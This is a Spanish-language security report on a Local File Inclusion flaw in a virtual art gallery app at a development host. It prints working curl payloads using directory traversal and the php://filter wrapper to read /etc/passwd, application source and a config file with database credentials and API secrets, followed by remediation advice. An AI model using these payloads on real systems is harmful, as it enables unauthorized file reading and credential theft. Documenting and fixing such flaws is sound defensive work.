# Informe de análisis LFI — Galería de Arte Virtual

## Resumen ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` de `gallery.php` del objetivo `http://web.dev.local:8081`.

La vulnerabilidad permite leer archivos arbitrarios del servidor. Se confirmó la lectura de `/etc/passwd` y, adicionalmente, mediante `php://filter`, se recuperó el código fuente de `gallery.php` y el contenido de `config.php`, exponiendo credenciales y secretos de la aplicación.

## Objetivo analizado

- URL base: `http://web.dev.local:8081`
- Componente vulnerable: `gallery.php`
- Parámetro vulnerable: `page`

## Metodología

1. Reconocimiento de la página principal y de los enlaces expuestos.
2. Identificación del parámetro `page` en rutas como `gallery.php?page=modern`.
3. Pruebas de path traversal sobre `page`.
4. Validación de lectura de archivos del sistema.
5. Explotación adicional con wrapper `php://filter/read=convert.base64-encode/resource=...` para recuperar código fuente y archivos de configuración.

## Evidencias y explotación

### 1. Confirmación de LFI por directory traversal

Solicitud utilizada:

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../etc/passwd'
```

Resultado observado en la respuesta:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

Además, una solicitud de control con un valor inexistente devolvió el mensaje:

```text
El archivo solicitado no existe: pages/nosuch.php
```

Esto indica que, en condiciones normales, la aplicación intenta resolver páginas dentro de `pages/<valor>.php`, pero acepta rutas de traversal como `../../../etc/passwd` sin validación adecuada.

### 2. Recuperación del código fuente de `gallery.php`

Solicitud utilizada:

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php'
```

Tras decodificar el blob base64 de la respuesta, se obtuvo un fragmento como el siguiente:

```php
<?php

$page = $_GET['page'] ?? 'modern';

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Galería - <?php echo htmlspecialchars($page); ?></title>
```

Esto confirma que el parámetro de usuario controla directamente la selección del archivo cargado y que el wrapper `php://filter` está habilitado para lectura.

### 3. Recuperación de archivo de configuración sensible

Solicitud utilizada:

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=config.php'
```

Contenido sensible recuperado tras decodificación:

```php
define('DB_HOST', 'localhost');
define('DB_USER', 'gallery_user');
define('DB_PASS', 'SuperSecret123!');
define('DB_NAME', 'gallery_db');

define('SECRET_KEY', 'th1s_is_a_v3ry_s3cr3t_k3y_2025');
define('API_TOKEN', 'api_token_abc123xyz789');
```

## Impacto

Impacto estimado: **Alto / Crítico**

La vulnerabilidad permite:

- Leer archivos arbitrarios del sistema (`/etc/passwd`, potencialmente otros accesibles por el usuario del proceso web).
- Obtener código fuente de la aplicación.
- Extraer credenciales de base de datos y secretos (`SECRET_KEY`, `API_TOKEN`).
- Facilitar movimientos posteriores, acceso a servicios internos o escalado a compromisos mayores si las credenciales son reutilizadas.

## Causa raíz probable

Uso inseguro del parámetro `page` para construir o incluir rutas de archivo sin una lista blanca estricta. La evidencia sugiere una lógica similar a:

```php
$page = $_GET['page'] ?? 'modern';
include($page);
```

o una variante que concatena `pages/` y `.php` solo para nombres simples, pero permite rutas con traversal o wrappers cuando el valor incluye separadores especiales.

## Recomendaciones

1. Eliminar cualquier `include()`/`require()` controlado por entrada del usuario.
2. Sustituir la resolución dinámica por una **lista blanca** cerrada, por ejemplo: `modern`, `classic`, `abstract`, `about`.
3. Resolver páginas mediante un mapa fijo (`modern => pages/modern.php`) y rechazar cualquier otro valor.
4. Deshabilitar el uso indebido de wrappers peligrosos cuando no sean necesarios.
5. Mover `config.php` y otros secretos fuera del directorio accesible por la aplicación web, o protegerlos con controles estrictos.
6. Rotar inmediatamente las credenciales y secretos expuestos (`DB_PASS`, `SECRET_KEY`, `API_TOKEN`).
7. Revisar logs y accesos en busca de explotación previa.

## Conclusión

La aplicación es vulnerable a **Local File Inclusion (LFI)** en `gallery.php?page`. La vulnerabilidad fue **confirmada y explotada con éxito** de forma no destructiva para leer `/etc/passwd`, recuperar el código fuente de `gallery.php` y extraer secretos desde `config.php`.
